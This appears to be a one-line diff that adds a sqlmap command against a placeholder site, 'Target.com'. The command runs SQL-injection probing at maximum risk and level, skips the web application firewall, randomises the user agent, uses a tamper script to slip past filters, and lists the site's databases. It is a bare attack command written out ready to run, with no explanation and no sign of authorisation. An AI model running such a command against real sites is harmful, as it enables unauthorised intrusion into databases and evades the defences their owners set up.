@@ -1,0 +1,1 @@
+python sqlmap.py -u "Target.com"  --batch --risk=3 --level=5 --skip-waf --random-agent --tamper="between" --dbs
